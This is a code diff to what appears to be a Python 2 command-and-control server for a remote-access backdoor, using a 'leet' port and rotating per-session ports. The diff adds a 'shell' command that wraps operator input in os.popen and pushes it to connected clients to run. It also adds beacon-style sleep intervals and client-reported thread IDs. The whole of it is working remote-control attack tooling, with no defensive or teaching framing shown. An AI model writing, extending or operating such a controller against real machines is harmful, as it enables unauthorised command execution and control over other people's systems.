@@ -9,7 +9,7 @@ import time
 import copy
 import json
 
-staticport = 31337
+staticport = 31339
 thread_count = 0
 
 class Server:
@@ -34,7 +34,7 @@ class Server:
         sys.stdout.write("> ")
         self.open_socket()
         self.input = [self.server,sys.stdin]
-        commands = {"quit": exit, "status": self.status, "porttimeout": self.changePortTimeout, "sendpy": self.sendPython, "quit": self.exit}
+        commands = {"shell": self.shell, "sleep": self.sleep, "status": self.status, "porttimeout": self.changePortTimeout, "send": self.sendPython, "quit": self.exit}
         running = 1
         while running:
             inputready,outputready,exceptready = select.select(self.input,[],[],1)
@@ -60,6 +60,20 @@ class Server:
         for c in self.rollingthreads:
             c.join()
 
+    def sleep(self, *args):
+        tid = int(args[0])
+
+        thread = False
+        for i in self.rollingthreads:
+            if i.thread_id == tid:
+                thread = i
+                break
+        if not thread:
+            return
+
+        thread.sleep(int(args[1]))
+        print "Changed client's sleep time to", args[1]
+
     def sendPython(self, *args):
         tid = int(args[0])
 
@@ -79,8 +93,13 @@ class Server:
                 break
         if not thread:
             return
-        print "Sending python to thread", thread.thread_id
+        print "Sending commands to thread", thread.thread_id
         thread.sendPython(py)
+
+    def shell(self, *args):
+        py = " ".join(args[1:])
+        py = "import os; print os.popen(\"" + py.replace('"', '\\"') + "\").read();"
+        self.sendPython(*[args[0], py])
 
     def changePortTimeout(self, timeout):
         self.porttimeout = int(timeout)
@@ -117,6 +136,8 @@ class RollingClient(threading.Thread):
         self.thread_id = thread_count
         thread_count += 1
         self.nextPy = False
+        self.sleep_time = 3
+        self.last_sleep = 3
 
     def sendPython(self, py):
         self.nextPy = py
@@ -125,17 +146,24 @@ class RollingClient(threading.Thread):
         try:
             self.newport = random.randint(10000,30000)
             data = {"code": self.nextPy, "newport": self.newport}
+
+            if (self.last_sleep != self.sleep_time):
+                self.last_sleep = self.sleep_time
+                data["sleep"] = self.sleep_time
+
             self.nextPy = False
             self.client.send(json.dumps(data) + chr(255))
             self.client.close()
             self.newsock = socket.socket()
-            self.newsock.settimeout(5)
+            #self.newsock.settimeout(self.sleep_time)
             self.newsock.bind(('',self.newport))
-            self.newsock.listen(5)
+            self.newsock.listen(self.sleep_time)
         except Exception as e:
             #print self.name + ": "+str(e)
             pass
 
+    def sleep(self, amt):
+        self.sleep_time = amt
 
     def readuntil(self, s):
         b = ""
@@ -157,13 +185,15 @@ class RollingClient(threading.Thread):
                 res = self.readuntil(self.client)
                 res = json.loads(res[:-1])
                 if "data" in res and len(res["data"]) > 0:
-                    print "Received python from {0} [Thread {1}]".format(self.address, self.thread_id)
+                    print "Received data from {0} [Thread {1}]".format(self.address, self.thread_id)
                     print "->", res["data"][:-1]
+                if "tid" in res and int(res["tid"]) != -1 and int(res["tid"]) != self.thread_id:
+                   self.thread_id = res["tid"]
             except Exception as e:
-                #print e
+                print e
                 self.exit()
                 return
-            time.sleep(1)
+            time.sleep(0.001)
             
 
 if __name__ == "__main__":
